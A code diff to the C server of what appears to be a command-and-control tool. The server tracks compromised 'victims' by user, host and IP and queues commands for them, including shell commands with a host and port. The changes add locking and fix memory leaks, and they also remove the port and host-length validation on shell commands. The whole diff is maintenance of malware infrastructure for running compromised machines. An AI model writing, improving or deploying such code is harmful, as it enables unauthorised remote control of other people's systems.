@@ -32,8 +32,6 @@
 #define NET_MAX_CLIENTS 128
 #endif
 
-int NET_PTHREAD_CLEANUP_POP = 0;
-
 pthread_mutex_t NET_PTHREAD_MUTEX = PTHREAD_MUTEX_INITIALIZER;
 
 int NET_VICTIMS_TOTAL = 0;
@@ -94,21 +92,23 @@ bool net_update_commands_count(net_server_beacon_t **p_commands){
   return true;
 }
 
+pthread_mutex_t NET_PTHREAD_MUTEX_UPDATE_COMMANDS = PTHREAD_MUTEX_INITIALIZER;
+
 int net_update_commands(net_server_beacon_t *command, net_server_beacon_t **commands){
   for (int i = 0; i < NET_MAX_CLIENTS; i++){
     if (commands[i] != NULL && (strcmp(commands[i]->uuid, command->uuid) == 0)){
-      pthread_mutex_lock(&NET_PTHREAD_MUTEX);
+      pthread_mutex_lock(&NET_PTHREAD_MUTEX_UPDATE_COMMANDS);
       commands[i] = command;
-      pthread_mutex_unlock(&NET_PTHREAD_MUTEX);
+      pthread_mutex_unlock(&NET_PTHREAD_MUTEX_UPDATE_COMMANDS);
       return i;
     }
   }
   for (int i = 0; i < NET_MAX_CLIENTS; i++){
     if (commands[i] == NULL){
-      pthread_mutex_lock(&NET_PTHREAD_MUTEX);
+      pthread_mutex_lock(&NET_PTHREAD_MUTEX_UPDATE_COMMANDS);
       commands[i] = command;
       net_update_commands_count(commands);
-      pthread_mutex_unlock(&NET_PTHREAD_MUTEX);
+      pthread_mutex_unlock(&NET_PTHREAD_MUTEX_UPDATE_COMMANDS);
       return i;
     }
   }
@@ -127,11 +127,6 @@ bool net_update_commands_shell(char *host,
     :p_commands: commands queue pointer
     :returns: boolean
   */
-  if (port < NET_PORT_MIN || port > NET_PORT_MAX){
-    return false;
-  } else if (strlen(host) > MAX_DOMAIN_LEN){
-    return false;
-  }
   net_server_cmd_shell_t *p_cmd_shell = malloc(sizeof(net_server_cmd_shell_t));
   net_server_beacon_t *p_command = malloc(sizeof(net_server_beacon_t));
   strncpy(p_cmd_shell->host, host, MAX_DOMAIN_LEN);
@@ -174,23 +169,30 @@ bool net_update_victim_count(net_client_beacon_t **p_victims){
   return true;
 }
 
+pthread_mutex_t NET_PTHREAD_MUTEX_UPDATE_VICTIMS = PTHREAD_MUTEX_INITIALIZER;
+
 int net_update_victims(net_client_beacon_t *victim, net_client_beacon_t **p_victims){
   /*
     :TODO: set pointer to current victims client beacon
     :p_victim: pointer to victim client beacon
     :returns: -1 on failure and element index on success
  */
+  
   for (int i = 0; i < NET_MAX_CLIENTS; i++){
     if (p_victims[i] != NULL &&
         (strcmp(p_victims[i]->sysinfo.uuid, victim->sysinfo.uuid) == 0)){
+      pthread_mutex_lock(&NET_PTHREAD_MUTEX_UPDATE_VICTIMS);
       p_victims[i] = victim;
+      pthread_mutex_unlock(&NET_PTHREAD_MUTEX_UPDATE_VICTIMS);
       return i;
     }
   }
   for (int i = 0; i < NET_MAX_CLIENTS; i++){
     if (p_victims[i] == NULL){
+      pthread_mutex_lock(&NET_PTHREAD_MUTEX_UPDATE_VICTIMS);
       p_victims[i] = victim;
       net_update_victim_count(p_victims);
+      pthread_mutex_unlock(&NET_PTHREAD_MUTEX_UPDATE_VICTIMS);
       return i;
     }
   }
@@ -217,10 +219,6 @@ bool net_remove_victims(net_client_beacon_t *victim, net_client_beacon_t **p_vic
   return false;
 }
 
-static void net_pthread_cleanup(void *args){
-  pthread_detach((pthread_t)args);
-}
-
 #ifndef NET_T_CLIENT_ARGS
 typedef struct{
   int client_fd;
@@ -236,9 +234,7 @@ void *net_t_client(void *args){
   net_client_beacon_t **p_victims = p_args->p_victims;
   net_server_beacon_t **p_commands = p_args->p_commands;
   net_client_beacon_t *p_net_client_beacon = malloc(sizeof(net_client_beacon_t));
-  net_server_beacon_t *p_net_server_beacon = malloc(sizeof(net_client_beacon_t));
-  pthread_t id = pthread_self();
-  pthread_cleanup_push(net_pthread_cleanup, &id);
+  net_server_beacon_t *p_net_server_beacon = malloc(sizeof(net_server_beacon_t));
   while (true){
     bool command = false;
     int read = recv(sock, p_net_client_beacon, sizeof(net_client_beacon_t), 0);
@@ -250,9 +246,7 @@ void *net_t_client(void *args){
       free(p_net_client_beacon);
       pthread_exit(NULL);
     }
-    pthread_mutex_lock(&NET_PTHREAD_MUTEX);
     net_update_victims(p_net_client_beacon, p_victims);
-    
     /* printf("[+] victims: %d\n", NET_VICTIMS_TOTAL); */
     /* printf("[+] CONNECT user:%s@%s, hostname:%s, arch:%s, release:%s, load:%d\n", */
     /*        p_net_client_beacon->sysinfo.username, */
@@ -278,14 +272,12 @@ void *net_t_client(void *args){
       p_net_server_beacon->status = true;
       if (send(sock, p_net_server_beacon, sizeof(net_server_beacon_t), 0) < 0){
         fprintf(stderr, "[x] %s\n", strerror(errno));
+        free(p_net_server_beacon);
         free(p_net_client_beacon);
         pthread_exit(NULL);
       }
     }
-    pthread_mutex_unlock(&NET_PTHREAD_MUTEX);
-    
   }
-  pthread_mutex_lock(&NET_PTHREAD_MUTEX);
   /* printf("[+] DISCONNECT user:%s@%s, hostname:%s, arch:%s, release:%s, load:%d\n", */
   /*        p_net_client_beacon->sysinfo.username, */
   /*        p_net_client_beacon->sysinfo.ip, */
@@ -295,13 +287,14 @@ void *net_t_client(void *args){
   /*        p_net_client_beacon->sysinfo.cpu_usage); */
   net_remove_victims(p_net_client_beacon, p_victims);
   /* printf("[+] victims %d\n", NET_VICTIMS_TOTAL); */
+  free(p_net_server_beacon);
   free(p_net_client_beacon);
-  pthread_mutex_unlock(&NET_PTHREAD_MUTEX);
-  pthread_cleanup_pop(0);
   pthread_exit(NULL);
 }
 
-bool net_server(int port, net_client_beacon_t **p_victims, net_server_beacon_t **p_commands){
+bool net_server(int port,
+                net_client_beacon_t **p_victims,
+                net_server_beacon_t **p_commands){
   /*
     :TODO: start listening server
     :port: (int) server listening port
@@ -338,16 +331,12 @@ bool net_server(int port, net_client_beacon_t **p_victims, net_server_beacon_t *
     fprintf(stderr, "[x] %s\n", strerror(errno));
     return false;
   }
-
   //printf("[+] bind to port %d\n", ntohs(server.sin_port));
-
   if (listen(server_fd, NET_MAX_CLIENTS)  != 0){
     fprintf(stderr, "[x] %s\n", strerror(errno));
     return false;
   }
-
   //printf("[+] listening\n");
-  
   while (true){
     socklen_t client_len = sizeof(client);
     while (( client_fd = accept(server_fd,
@@ -380,12 +369,9 @@ typedef struct{
 #endif
 
 void *net_pthread_server(void *args){
-  pthread_t id = pthread_self();
-  pthread_cleanup_push(net_pthread_cleanup, &id);
   net_pthread_server_args_t  *p_args = args;
   net_server(p_args->port, p_args->p_victims, p_args->p_commands);
   free(p_args);
-  pthread_cleanup_pop(0);
   pthread_exit(NULL);
 }
 
